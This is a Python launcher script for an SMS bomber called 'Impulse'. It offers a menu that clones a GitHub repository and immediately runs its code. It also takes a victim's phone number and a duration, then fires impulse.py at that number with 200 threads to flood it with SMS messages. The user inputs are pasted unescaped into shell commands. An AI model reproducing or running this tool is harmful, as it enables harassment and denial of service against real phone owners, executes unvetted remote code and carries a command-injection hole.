from termcolor import colored
from os import system
import platform, time

def Banner():
    if platform.system() == "Windows":
        system("cls")
    else:
        system("clear")
    print("")
    print(colored("        [", "red")+colored("~", "blue"), colored("Impulse LVL Up!", "red"))
    print(colored("        [", "red")+colored("~", "blue"), colored("By Lucky", "red"))
    print(colored("        [", "red")+colored("~", "blue"), colored("TG | https://t.me/HTPFLcom", "red"))
    print("\n")
    a2 = open("modules.txt", "r")
    a = a2.read()
    a = str(a)
    a2.close()
    if a == "yes":
        print(colored("[1]", "red"), colored("Download Modules", "green") + colored("✅", "green"))
    else:
        print(colored("[1]", "red"), colored("Download Modules", "red")+colored("❌", "red"))
    print("")
    print(colored("[2]", "red"), colored("Sms Bomber", "blue"))
    print("\n")
    print(colored("[0] Exit", "red"))
    print("")
    osnova = input(colored(" --> ", "red"))
    if osnova == "1":
        if a != "yes":
            print(colored("\nStarting download...\n", "yellow"))
            time.sleep(3)
            system("pip3 install -r requirements.txt")
            system("git clone https://github.com/Risonte1/Bomber && cd Bomber && python main.py")
            a = open("modules.txt", "w")
            a.write("yes")
            a.close()
            print(colored("\nComplete!\n", "green"))
            time.sleep(1.8)
            system("python Bomber.py")
            time.sleep(0.5)
            exit(0)
        else:
            print(colored("You have already installed the modules!", "red"))
            time.sleep(4)
            system("python Bomber.py")
            time.sleep(0.5)
            exit(0)
    elif osnova == "2":
        if a != "yes":
            print(colored("You didn't download the modules!", "red"))
            time.sleep(4)
            system("python Bomber.py")
            time.sleep(0.5)
            exit(0)
        else:
            if platform.system() == "Windows":
                system("cls")
            else:
                system("clear")
            print(colored("\n[!]", "blue"), colored("Loading...\n", "green"))
            time.sleep(3)
            if platform.system() == "Windows":
                system("cls")
            else:
                system("clear")
            number = input(colored("Number ", "red")+"+")
            print(colored("Number", "red")+colored(" | ", "blue")+colored("+"+str(number), "green"))
            timer = input(colored("Time in Seconds ", "blue"))
            print(colored("Time", "red") + colored(" | ", "blue") + colored("+" + str(timer), "green"))
            try:
                timer = int(timer)
            except:
                if platform.system() == "Windows":
                    system("cls")
                else:
                    system("clear")
                print(colored("Your time is not a numeric value!"))
                exit(0)
            if platform.system() == "Windows":
                system("cls")
            else:
                system("clear")
            try:
                print(colored("Stop spam Ctrl + C", "green"))
                time.sleep(4)
                system("python impulse.py --target " + str(number) + " --method SMS --time "+str(timer)+" --threads 200")
            except KeyboardInterrupt:
                system("python Bomber.py")
                time.sleep(0.5)
                exit(0)
            system("python Bomber.py")
            time.sleep(0.5)
            exit(0)

    else:
        if platform.system() == "Windows":
            system("cls")
        else:
            system("clear")
        print(colored("By!", "green"))
        exit(0)


Banner()